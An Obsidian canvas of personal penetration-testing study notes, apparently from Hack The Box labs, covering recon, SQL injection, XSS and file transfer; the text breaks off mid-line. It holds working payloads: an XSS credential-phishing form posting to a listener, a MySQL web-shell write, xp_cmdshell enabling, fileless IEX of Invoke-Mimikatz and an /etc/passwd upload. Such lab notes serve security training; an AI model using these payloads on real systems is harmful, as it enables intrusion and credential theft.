{
	"nodes":[
		{"id":"eb834918e3ebdb35","type":"group","x":2900,"y":-520,"width":4500,"height":5130,"label":"Host-based && Passwords"},
		{"id":"742367986f64dfb3","type":"group","x":2040,"y":5280,"width":5520,"height":2640,"label":"SQL"},
		{"id":"2fcad919e0b399df","type":"group","x":2920,"y":-3120,"width":6360,"height":1960,"label":"Pivot/Tunnel/Port Forward/Proxy"},
		{"id":"cfad60309c7e7fbf","type":"group","x":4720,"y":-440,"width":2600,"height":3560,"label":"Windows"},
		{"id":"8f7927002aea72e5","type":"group","x":7840,"y":-520,"width":3760,"height":2440,"label":"File Transfer"},
		{"id":"30caaa3d20e9dbc8","type":"group","x":-1493,"y":-1031,"width":2243,"height":3591,"label":"Enumeration/Footprinting"},
		{"id":"a0ab2b0d78e9b580","type":"group","x":2980,"y":-440,"width":1660,"height":3320,"label":"Linux"},
		{"id":"81d68df3d50f4bb7","type":"group","x":3140,"y":5360,"width":1160,"height":2520,"label":"Enumeration"},
		{"id":"7ace9c405e81c0b2","type":"group","x":720,"y":1440,"width":1300,"height":1220,"label":"Brute-force"},
		{"id":"9bc9741a6f2b82e6","type":"group","x":-980,"y":-3280,"width":933,"height":800,"color":"3","label":"Social Engineering"},
		{"id":"a1f2b606c1b08256","type":"group","x":-980,"y":-2100,"width":1233,"height":600,"label":"Passive"},
		{"id":"d7f71c9ecbe2f2db","type":"group","x":1080,"y":280,"width":960,"height":760,"color":"6","label":"Metasploit"},
		{"id":"09465df5e333519c","type":"group","x":320,"y":-2098,"width":860,"height":598,"label":"Active\\Fingerprinting"},
		{"id":"fd49c06a78ed5f52","type":"group","x":-934,"y":-3220,"width":840,"height":180,"label":"Phone"},
		{"id":"ea66b3ebc19ce312","type":"group","x":-933,"y":-2980,"width":840,"height":180,"label":"Content"},
		{"id":"2e7e258a308ff3fb","type":"group","x":-920,"y":-2029,"width":560,"height":260,"label":"Domain"},
		{"id":"15172ada4fec3362","type":"group","x":-940,"y":-1680,"width":720,"height":138,"label":"Subdomain lookup using CT logs"},
		{"id":"e7a9f3ef3d8239a7","type":"text","text":"## Ping Sweep\n#### msfconsole\n```shell-session\nmeterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23\n```\n#### Linux\n```bash\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &) ;done\n```\n#### CMD\n```bash\nfor /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"\n```\n#### PowerShell\n```powershell\n1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}\n```","x":-100,"y":260,"width":820,"height":580},
		{"id":"24bd33158de2e527","type":"text","text":"- `gobuster` \n```shell-session\ngobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain\n```\n","x":-100,"y":-220,"width":574,"height":320},
		{"id":"dd7be710f2ad7e91","type":"text","text":" #### [[8) MySQL]]\n \n - ` show databases; `\n - ` use <database>; `\n - ` show tables; `\n - ` show columns from <table>; `\n- ` select * from <table>; `\n - ` select * from <table> where <column> = \"<string>\"; `\n\n","x":-727,"y":1260,"width":574,"height":260},
		{"id":"59556103dd3d44b9","type":"text","text":"#### [[9) MSSQL]]\n\n","x":-727,"y":1540,"width":574,"height":60},
		{"id":"43c2a34c5cd5bba0","type":"text","text":"#### [[7) SNMP]]\n\n- `snmpwalk`\n- `onesixtyone`\n- `braa`\n- Community string (bf): `SecLists/Discovery/SNMP/snmp.txt`","x":-727,"y":1040,"width":574,"height":200},
		{"id":"744e842a4a08c933","type":"text","text":"##### FTP bounce attack\n\n```bash\nbuduboti@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT\nResolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).\nAttempting connection to ftp://anonymous:password@10.10.110.213:21\nConnected:220 (vsFTPd 3.0.3)\nLogin credentials accepted by FTP server!\nInitiating Bounce Scan at 04:55\nFTP command misalignment detected ... correcting.\nCompleted Bounce Scan at 04:55, 0.54s elapsed (1 total ports)\nNmap scan report for 172.17.0.2\nHost is up.\n\nPORT   STATE  SERVICE\n80/tcp open http\n\n<SNIP>\n```","x":-120,"y":-1000,"width":815,"height":480},
		{"id":"bde918b4f4706179","type":"text","text":"##### [[4) DNS]]\n###### Tools\n- `dnsenum` [github](https://github.com/fwaeytens/dnsenum)\n```\ndnsenum --enum -p 0 -s 0 \\\n\t[--dnsserver <DNS_SERVER>] \\\n\t[-o <OUTPUT>] \\ \n\t-f <WORDLIST> \\\n\tDOMAIN\n```\n","x":-727,"y":-220,"width":574,"height":320},
		{"id":"ed11813fcbefe999","type":"text","text":"#### [[6) IMAP & POP3]]\n###### IMAP Commands\n - ` 1 LOGIN username password `\n - ` 1 LIST \"\" * `\n - ` 1 CREATE \"INBOX\" `\n - ` 1 DELETE \"INBOX\" `\n - ` 1 RENAME \"ToRead\" \"Important\" `\n - ` 1 LSUB \"\" * `\n - ` 1 SELECT INBOX `\n - ` 1 UNSELECT INBOX `\n - ` 1 FETCH <ID> all `\n - ` 1 CLOSE `\n - ` 1 LOGOUT `\n###### POP3 Commands\n - ` USER username `\n - ` PASS password `\n - ` STAT `\n - ` LIST `\n - ` RETR id `\n - ` DELE id `\n - ` CAPA `\n - ` RSET `\n - ` QUIT `","x":-727,"y":280,"width":574,"height":740},
		{"id":"5678285ef03f5fda","type":"text","text":"##### [[5) SMTP]]\n```\nHELO|EHLO <SERVER>\nVRFY <USERNAME> -- may enum usernames\n```","x":-727,"y":120,"width":574,"height":140},
		{"id":"652687788106a5c8","type":"text","text":"##### [[1) FTP]]\nGet all files:\n```\nwget -m --no-passive \\\nftp://<USERNAME|anonymous>:<PASSWORD|anonymous>@<HOST|IP>\n```\n","x":-727,"y":-1000,"width":574,"height":197},
		{"id":"dcf5aba1c7cb5bd8","type":"text","text":"### SSH if get_file via like webPageCVE\nhttps://www.youtube.com/watch?v=2rqb3YSa1SE","x":153,"y":2927,"width":487,"height":113},
		{"id":"e313ea9ede6969cd","type":"text","text":"#### [[10) Oracle TNS]]\nDefault creds:\n- `CHANGE_ON_INSTALL` (Oracle 9)\n- `dbsnmp` (Oracle DBSNMP)\n\nIf used with `finger` service, may be vulnerable.\nTools: \n- [odat.py](https://github.com/quentinhardy/odat.git) (ex: `./odat.py all -s <IP>`)\n- `sqlplus`\n\nCommands:\n- `DESCRIPTION`\n- `ADDRESS`\n- `PROTOCOL`\n- `PORT`\n- `CONNECT_DATA`\n- `INSTANCE_NAME`\n- `SERVICE_NAME`\n- `SERVER`\n- `USER`\n- `PASSWORD`\n- `SECURITY`\n- `VALIDATE_CERT`\n- `SSL_VERSION`\n- `CONNECT_TIMEOUT`\n- `RECEIVE_TIMEOUT`\n- `SEND_TIMEOUT`\n- `SQLNET.EXPIRE_TIME`\n- `TRACE_LEVEL`\n- `TRACE_DIRECTORY`\n- `TRACE_FILE_NAME`\n- `LOG_FILE`","x":-727,"y":1620,"width":574,"height":920},
		{"id":"72ae39711384673a","type":"text","text":"### Fake website\n\n- `Evil Portal`\n- `BlackEye`\n","x":-560,"y":2900,"width":423,"height":280},
		{"id":"b64ef99df916cf1e","type":"text","text":"Phishing","x":-560,"y":3440,"width":250,"height":60},
		{"id":"ffb69dfe6e46ed25","type":"text","text":"# XSS\n## Types:\n| Type                             | Description                                                                                                                                                                                                                                  |     |\n| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |\n| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                   |     |\n| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |     |\n| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |     |\n## Payloads\nServer-based\n```html\n<script>alert(window.origin)</script> <!-- Because of IFrames -->\n```\nDOM-based\n```html\n<img src=\"\" onerror=alert(window.origin)>\n```\n#### Cookie Stealer\nServer-based\n```html\n<script>alert(document.cookie)</script>\n```\nDOM-based\n```html\n<img src=\"\" onerror=alert(document.cookie)>\n```\n\n### To Steal Creds:\n\n1. find the page where you can inject js,\n2. modify the page to look like their login form, \n3. get the url, \n4. spinup a listening and redirecting server,\n5. send to people, so the payload in the url.\n\nExercise: https://academy.hackthebox.com/module/103/section/984\nPayload that worked (as sent payload):\n```\nhttp://10.129.218.90/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3+style%3D%22text-align%3A+center%3B%22%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp://10.10.15.21:8000%2F%3E%3Cinput+style%3D%22width%3A+20%25%3B+padding%3A+5px+5px%3B+margin%3A+0px+auto%3B+box-sizing%3A+border_box%3B+display%3A+block%3B%22+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+style%3D%22width%3A+20%25%3B+padding%3A+5px+5px%3B+margin%3A+10px+auto%3B+box-sizing%3A+border_box%3B+display%3A+block%3B%22+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+style%3D%22width%3A+20%25%3B+padding%3A+5px+5px%3B+margin%3A+0px+auto%3B+box-sizing%3A+border_box%3B+display%3A+block%3B%22+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--\n```\nEncoded version:\n```html\nhttp://10.129.218.90/phishing/index.php?url='><script>document.write('<h3 style=\"text-align: center;\">Please login to continue</h3><form action=http://10.10.15.21:8000/><input style=\"width: 20%; padding: 5px 5px; margin: 0px auto; box-sizing: border_box; display: block;\" type=\"username\" name=\"username\" placeholder=\"Username\"><input style=\"width: 20%; padding: 5px 5px; margin: 10px auto; box-sizing: border_box; display: block;\" type=\"password\" name=\"password\" placeholder=\"Password\"><input style=\"width: 20%; padding: 5px 5px; margin: 0px auto; box-sizing: border_box; display: block;\" type=\"submit\" name=\"submit\" value=\"Login\"></form>');document.getElementById('urlform').remove();</script><!--\n```","x":-887,"y":3760,"width":987,"height":1700},
		{"id":"cc0cfb556177bd62","type":"file","file":"obs/pages/gobuster.md","x":-159,"y":-1751,"width":324,"height":189},
		{"id":"4d48a248077eccbd","type":"text","text":"[TheHarvester](https://github.com/laramies/theHarvester) [[./script/harvester.conf]]\n","x":-34,"y":-1984,"width":250,"height":60},
		{"id":"2c128984c2ad7364","type":"text","text":"[Wayback Machine](http://web.archive.org/)","x":-34,"y":-1924,"width":250,"height":60},
		{"id":"a59131683939524b","type":"text","text":"[Virus Total](https://www.virustotal.com/gui/home/search)","x":-284,"y":-1984,"width":250,"height":60},
		{"id":"4f42dbcc11fb5930","type":"text","text":"[CenSys](https://censys.io/)","x":-284,"y":-1924,"width":250,"height":60},
		{"id":"f69f303114821182","type":"text","text":"WHOIS: `whois $TARGET_DOMAIN`","x":-880,"y":-1984,"width":462,"height":55},
		{"id":"8ac75a8cf80dbb3a","type":"text","text":"[Crt.sh](https://crt.sh)  [[./script/crt.sh]]","x":-284,"y":-1864,"width":250,"height":60},
		{"id":"5d5efa777e21eeeb","type":"text","text":"AI / DeepFake / DeepVoice","x":-854,"y":-2940,"width":380,"height":60},
		{"id":"0638c21867edb280","type":"text","text":"Caller id spoofing [STUNT BANANA](https://github.com/buduboti/stuntbanana)","x":-854,"y":-3180,"width":380,"height":60},
		{"id":"75412a5ee44f6d69","type":"text","text":"DIG: `dig any $TARGET_DOMAIN`","x":-880,"y":-1929,"width":462,"height":55},
		{"id":"f3db437ecf434afd","type":"text","text":"``` bash\ncurl -s \"https://crt.sh/?q=$TARGET_DOMAIN&output=json\" | jq -r '[.[] | .name_value] | map(split(\"\\n\")) | flatten | .[]' | sort -u\n```","x":-920,"y":-1662,"width":670,"height":100},
		{"id":"22ac7a79e17e66f3","type":"text","text":"NSLOOKUP: `nslookup any $TARGET_DOMAIN`","x":-880,"y":-1874,"width":462,"height":55},
		{"id":"1b754128ff1d96c2","type":"text","text":"Domain `export TARGET_DOMAIN=\"\"`","x":-1360,"y":-1949,"width":356,"height":55},
		{"id":"653e1bf67d8e68f1","type":"text","text":"IP `export TARGET_DOMAIN=\"\"`","x":-1360,"y":-2169,"width":356,"height":64},
		{"id":"a04df860f5774444","type":"text","text":"##### [[SMB]]\n[SMB](Cheatsheets/SMB.pdf)\n###### Tools\n - `smbclient`\n - `smbstatus`\n - `rpcclient`\n - `impacket-samrdump` #(Python)\n - `smbmap`\n - `crackmapexec`\n - `enum4linux-ng`","x":-727,"y":-780,"width":574,"height":380},
		{"id":"4d6e35efc402f0ff","type":"text","text":"Enumeration/Footprinting","x":-1473,"y":990,"width":250,"height":60},
		{"id":"5af52eedc0e2b307","type":"text","text":"##### [[3) NFS]]\n###### Tools\n- `showmount -e`","x":-727,"y":-380,"width":574,"height":140},
		{"id":"10409c9c4d226d76","type":"text","text":"# SQL Map\n\n`%` - is wildcard in (My)SQL\n## To Check:\n\n- [ ] GET/POST parameters\n- [ ] JSON parameters\n- [ ] Cookies !!!\n\n### Testable parameter\nA testable parameter can be marked as `1*` \nex: for a cookie check `--cookie=\"id=1*\"`\n\n```\n  (o)   --batch                                         # no user interaction needed\n  (o)   --dump                                          # dump all data automatically\n  (o)   --method          <method>                      # GET, POST, PUT, etc.\n\t-H                    'header'                  # curl like\n\t-p                    <prone_parameter>         # if we have a clear indication that this parameter is prone to an SQLi,\n\t\t\t\t\t\t\t# this narrows down the test only to this parameter\n\t--data                'POST data' \n\t-r                    <request_file>            # like one from Burp Suite\n\t\n\t--cookie='cookie'                               # cookie setting\n     Examples:\n\t\t--cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'\n\t\t-H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'     # same\n\n\t-host                  '<host>'                 # Specifies the Host\n\t                                                # More info: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host\n\n\t--referer              '<referer>'              # Specifies the Referer\n\t                                                # More info: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t-A/--user-agent        '<user_agent>'           # Specifies the User-Agent \n\n\t--random-agent                                  # randomly select a `User-agent` from the included regular browser values\n\t--mobile                                        # imitate the smartphone (by header | guess: user-agent)\n\t\n```\n\n### Error handling\n```\n\t--parse-errors                                  # Log SQL errors as well\n\t-t                     '<file_name>'            # Saves the traffic into this file\n\t-v                     'LEVEL=1,2,3,4,5,6'      # Sets the verbosity level\n\t\t\t\t\t\t\t# 3(+): Payload\n\t--proxy                '[...]'                  # Proxy (e.g., Burp)\n```\n### Tuning\n```\n\t--prefix=\"%'))\"\n\t--suffix=\"-- -\"\n\t--level                 'LEVEL=(1-5) [1]'       # Extends prefix and suffix set\n\t\t\t\t\t\t\t# 1: GET + POST\n\t\t\t\t\t\t\t# 2: HTTP Cookies\n\t\t\t\t\t\t\t# 3: HTTP User-Agent / Referer\n\t\t\t\t\t\t\t# 4: More Payloads\n\t\t\t\t\t\t\t# 5: HTTP Host\n\t--risk                  'LEVEL=(1-3) [1]'       # Extends prefix set\n\t\t\t\t\t\t\t# 1: no harm\n\t\t\t\t\t\t\t# 2: DoS\n\t\t\t\t\t\t\t# 3: possible changes\n```\n### Tuning\n```\n\t--code=<HTTP_Status>                            # Check HTTP response code if it's the provided\n\t\t--code=200\n\t--string=<Str_in_response>                      # Check if Str is present in the response\n\t\t--string=success\n\t--titles                                        # Check <title> \n\t--text-only                                     # Hides non visible HTML tags\n\t--technique=<Techniques>                        # Specifies the techniques\n\t\t--technique=BEU\n\t\t\t\t\t\t\t\t# B: Boolean-based blind\n\t\t\t\t\t\t\t\t# E: Error-based\n\t\t\t\t\t\t\t\t# U: Union query-based\n\t\t\t\t\t\t\t\t# S: Stacked queries\n\t\t\t\t\t\t\t\t# T: Time-based blind\n\t\t\t\t\t\t\t\t# Q: Inline queries\n\t--union-cols=<No._of_cols>                      # Exact number of columns (if we found out somehow)\n```","x":4360,"y":5324,"width":1326,"height":2336},
		{"id":"93491582b91a151b","type":"text","text":"# Protected file transfer\n## Windows\n```powershell\nPS C:\\htb> Import-Module .\\Invoke-AESEncryption.ps1\n```\nThe `Invoke-AESEncryption.ps1` file is located under `remote-tools/scripts`\n```powershell\nPS C:\\htb> Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\n```\n## Linux\n```bash\n# Encrypt\nopenssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n```\n```bash\n# Decrypt\nopenssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    \n```\n","x":9400,"y":1323,"width":860,"height":540},
		{"id":"191d5d0696ad4370","type":"text","text":"# Connecting\n\n### To MySQL \n```bash\nmysql -u julio -pPassword123 -h 10.129.20.13 # From mac & Linux\n```\n### To MsSQL\n```cmd\nsqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30       :: From windows\n```\n> Note to `sqlcmd`: use `GO` after the query to execute!\n\n> **Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.\n---\n```bash\n# From Linux\nsqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h            # SQL Creds\nsqsh -S 10.129.203.7 -U .\\\\julio -P 'MyPassword!' -h         # Windows Creds\n```\n> **Note:** When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.\n---\n```bash\nmssqlclient.py -p 1433 julio@10.129.203.7 \n```\n```bash\nmssqlclient.py -p 1433 julio@10.129.203.7 -windows-auth\n```","x":5760,"y":5324,"width":1326,"height":816},
		{"id":"e2c08c0d6317ded8","type":"text","text":"# SQL injection\n\n![dbms_architecture](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)\n## In-band\n### Union Based\nWith `Union Based` SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there.\n\n### Error Based\nFor `Error Based` SQL injection, it is used when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.\n\n## Blind \nIn more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as `Blind` SQL injection, and it also has two types: `Boolean Based` and `Time Based`.\n\n### Boolean Based\nWith `Boolean Based` SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns `true`.\n\n### Time Based\nAs for `Time Based` SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.\n\n## Out-of-band\nFinally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as `Out-of-band` SQL injection.\n\n\n# SQLi Discovery\n\nCheck theese payloads:\n\n|Payload|URL Encoded|\n|---|---|\n|`'`|`%27`|\n|`\"`|`%22`|\n|`#`|`%23`|\n|`;`|`%3B`|\n|`)`|`%29`|","x":2080,"y":5324,"width":1020,"height":1696},
		{"id":"cf12db776246de62","type":"text","text":"# Union\n\nYou can UNION multiple tables together; the column (and their type has to be the same);\n\nColumn number check: `ORDER BY` or `UNION` and check the results (error message?)\n\nFill columns with junk: `UNION SELECT 1,@@version,user(),4 -- -` (`-- -` because of showing the space)","x":2080,"y":7060,"width":1020,"height":220},
		{"id":"856a6cfb4860b1fe","type":"text","text":"# MySQL\n\n| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |\n| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |\n| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |\n| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |\n| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |\n# `SHOW DATABASES`\n```sql\nSELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -\n```\n - Current Database: `database()`\n\n```sql\nSELECT 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -\n```\n\n```sql\nSELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -\n```\n\n```sql\nSELECT 1,username,password,3 from dev.credentials-- -\n```\n\n## Current user\n```sql\nSELECT USER()\nSELECT CURRENT_USER()\nSELECT user from mysql.user\n```\n\n### List users with privileges\n```sql\nSELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- WHERE grantee=\"'root'@'localhost'\"-- -\n```\n\n## File read\n```sql\nSELECT LOAD_FILE('/etc/passwd');\n```\n\nAlso, `LOAD_FILE(\"/var/www/html/search.php\")` the current file and see the php source code (so trace back the conn and the db_pass)!\n","x":3180,"y":5400,"width":1080,"height":1140},
		{"id":"bdb03c9d8950eed3","type":"text","text":"# SQLmap\n## Basic DB Data Enumeration\n\n| Flag             | Description                          |\n| ---------------- | ------------------------------------ |\n| `--banner`       | Database version bann                |\n| `--current-user` | Current user n                       |\n| `--current-db`   | Current database                     |\n| `--is-dba`       | Checking if the current user has DBA |\n### Table Enumeration\n```bash\nsqlmap -u \"http://www.example.com/?id=1\" --tables -D testdb\n```\n```bash\nsqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb\n```\n### Table/Row Enumeration\n```bash\nsqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb -C name,surname\n```\nBy ordinal numbers:\n```bash\nsqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --start=2 --stop=3\n```\n### Conditional Enumeration\n```bash\nsqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"\n```\n### Full DB Enumeration\nSkipping `-T`, SQLmap will dump the whole DB.\nWith `--dump-all` will dump all the DB's on the server.\nWith `--exclude-sysdbs` will skip system databases.\n### DB Schema Enumeration\n`--schema` for the tables schema\n`--search` to search in the DB (LIKE) \n\n```\n\t--search -T user              # search a table LIKE 'user'\n\t--search -C pass              # search a column LIKE 'pass'\n``` \n\n`--passwords` Searches the DB for passwords and tries to crack them. (`--all` && `--batch` )","x":3180,"y":6540,"width":1080,"height":1300},
		{"id":"2dc7c27092573a3b","type":"text","text":"# MySQL\n\n### Write to file\n```mysql\nmysql> SELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE '/var/www/html/webshell.php';\n```\n## Permissions (check)\n```mysql\nshow variables like \"secure_file_priv\";\n```\n -> if empty, `LOAD DATA`, `SELECT ... INTO OUTFILE` & `LOAD_FILE()` is permitted\n -> if folder, permitted only in that folder\n -> if `NONE`, permission denied\n ","x":5760,"y":7240,"width":1326,"height":420},
		{"id":"98a5cf785696cda3","type":"text","text":"# MsSQL\n## Command Execution\n### XP_CMDSHELL\n```SQL\n1> xp_cmdshell 'whoami'\n2> GO\n\noutput\n-----------------------------\nno service\\mssql$sqlexpress\nNULL\n(2 rows affected)\n```\nIf `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:\n```mssql\n-- To allow advanced options to be changed.  \nEXECUTE sp_configure 'show advanced options', 1\nGO\n\n-- To update the currently configured value for advanced options.  \nRECONFIGURE\nGO  \n\n-- To enable the feature.  \nEXECUTE sp_configure 'xp_cmdshell', 1\nGO  \n\n-- To update the currently configured value for this feature.  \nRECONFIGURE\nGO\n```\nThere are also additional functionalities that can be used like the `xp_regwrite` command.\n###  xp_dirtree & xp_dirtree\nIf `EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'` or `EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'` Does not return `Permission Denied`, you can fire up a responder and connect to it and steal the service user's cred.\n","x":5760,"y":6200,"width":1326,"height":980},
		{"id":"e5071fb545ff31dc","type":"text","text":"# Languages\n#### Python\n```bash\n### Download\npython2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\npython3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n\n### Upload\n# @Server\npython3 -m uploadserver \n# @Client\npython3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n```\n#### PHP\n```bash\n# Download with File_get_contents()\nphp -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n\n# PHP Download with Fopen()\nphp -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n\n# File-less php\nphp -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num => $line) { echo $line; }' | bash\n```\n#### Ruby\n```bash\nruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n```\n#### Perl\n```bash\nperl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n```\n## @Windows\n### JS\n```powershell\nC:\\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n```\n```javascript\n// @wget.js\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n```\n### VBScript\n```powershell\nC:\\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n```\n```vbscript\n' @wget.vbs\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n```","x":9520,"y":-480,"width":2040,"height":1750},
		{"id":"834ede84d89b3e15","type":"text","text":"# WinRM\n```powershell\nPS C:\\htb> Test-NetConnection -ComputerName TARGET -Port 5985                                      # Test the connection\nPS C:\\htb> $Session = New-PSSession -ComputerName TARGET                                           # Create session\nPS C:\\htb> Copy-Item -Path \"C:\\path\\to\\file\" -ToSession $Session -Destination \"C:\\path\\on\\target\"  # Copy file from remote host\nPS C:\\htb> Copy-Item -Path \"C:\\path\\to\\file\" -Destination \"C:\\\" -FromSession $Session              # Copy file from localhost\n```","x":10340,"y":1333,"width":1220,"height":220},
		{"id":"a4a0a6f9e8829076","type":"text","text":"# RDP\n```bash\nrdesktop <host> -d <domain> -u <user> -p '<password>' -r disk:linux='/folder/to/mount'     # Mounting a Linux Folder Using rdesktop\nxfreerdp /v:<host> /d:<domain> /u:<user> /p:'<password>' /drive:linux,/folder/to/mount     # Mounting a Linux Folder Using xfreerdp\n```","x":10350,"y":1593,"width":1200,"height":181},
		{"id":"5a38bc7b9fd49314","type":"text","text":"# Windows\n```powershell\n# Encode base64\nPS C:\\htb> [Convert]::ToBase64String((Get-Content -path \"C:\\path\\to\\file\" -Encoding byte))\nPS C:\\htb> Get-FileHash \"C:\\path\\to\\file\" -Algorithm MD5 | select Hash # Get MD5-Hash to check\n\n#Decode base64\nPS C:\\htb> [IO.File]::WriteAllBytes(\"C:\\path\\to'file\", [Convert]::FromBase64String(\"<BASE64-CODE>\"))\nPS C:\\htb> Get-FileHash C:\\path\\to\\file -Algorithm md5 # MD5-hash\n\n# File download\nPS C:\\htb> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')\nPS C:\\htb> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')\n\n# curl/wget(/iwr) like download (curl and wget are aliases to this)\nPS C:\\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing\n\n#TLS error:\nPS C:\\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n\n# File-less (aka load'n'run)\nPS C:\\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\nPS 